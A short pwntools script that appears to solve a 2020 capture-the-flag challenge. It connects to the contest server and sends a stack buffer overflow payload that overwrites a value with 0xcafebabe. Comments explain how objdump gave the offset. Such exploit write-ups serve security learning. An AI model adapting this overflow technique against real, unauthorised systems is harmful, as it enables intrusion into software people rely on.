from pwn import * 
connection = remote('2020.redpwnc.tf', 31255)
# offset is allocated + 8
offset = 16+8
# through objdump -d we know the machine is 64 bit
# through objdump -d we know we want to overwrite code as 0xcafebabe
code = p64(0xcafebabe)
#perform the bufferoverflow itself
connection.sendline(offset*code)
connection.interactive()